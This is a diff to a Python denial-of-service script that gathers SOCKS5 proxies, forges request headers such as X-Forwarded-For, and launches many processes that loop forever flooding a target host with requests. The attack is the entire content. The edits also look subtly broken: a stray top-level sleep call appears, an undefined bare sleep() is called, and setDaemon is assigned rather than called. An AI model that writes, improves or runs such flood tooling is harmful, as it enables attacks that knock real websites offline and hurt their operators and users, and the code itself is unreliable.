@@ -1,4 +1,5 @@
 import ssl
+import multiprocessing
 import threading
 import socket
 import random
@@ -79,7 +80,7 @@ def checkProxies():
     for proxy in proxies:
         f.write(proxy)
     f.close()
- 
+time.sleep(1)
 def Flood(indexPicker):
     if indexPicker < len(proxies):
         proxy = proxies[indexPicker].strip().split(":")
@@ -89,12 +90,10 @@ def Flood(indexPicker):
         userAgent = userAgentList[indexPicker]
     else:
         userAgent = rC(userAgentList)
-    Connection = "Connection: Keep-Alive\r\n"
-    Accept = "Accept: */*\r\n"
-    Referer = "Referer: https://google.com?q=" + targetHost + "\r\n"
+    Connection = "Connection: null\r\n"
+    Referer = "Referer: null\r\n"
     X_Forwarded_For = f"X-Forwarded-For: {proxy[0]}, {proxy[0][::-1]}\r\n"
-    User_Agent = "User-Agent: " + userAgent + "\r\n\r\n"
-
+    User_Agent = "User-Agent: null\r\n\r\n"
     while True:
         try:
             socks.setdefaultproxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
@@ -112,9 +111,9 @@ def Flood(indexPicker):
                 s.close()
                 print("Flood sent " + proxy[0] + ":" + proxy[1])
             except:
-                s.close()
+                time.sleep(.1)
         except:
-            time.sleep(.1)
+            pass
  
 if "--socksCrawler" in sys.argv:
     socksCrawler()
@@ -133,12 +132,13 @@ if "--checkProxies" in sys.argv:
 else:
     proxies = open("socks5.txt").readlines()
 userAgentList = []
-
 for _ in range(100):
     userAgent = UserAgent().random
     userAgentList.append(userAgent)
-for indexPicker in range(threadNumber):
-    process = multiprocessing.Process(target=Flood, args=(indexPicker, ))
-    process.setDaemon = True
-    process.start()
- 
+def Attack():
+    for indexPicker in range(threadNumber):
+        process = multiprocessing.Process(target=Flood, args=(indexPicker, ))
+        process.setDaemon = False
+        process.start()
+Attack()
+sleep(1)
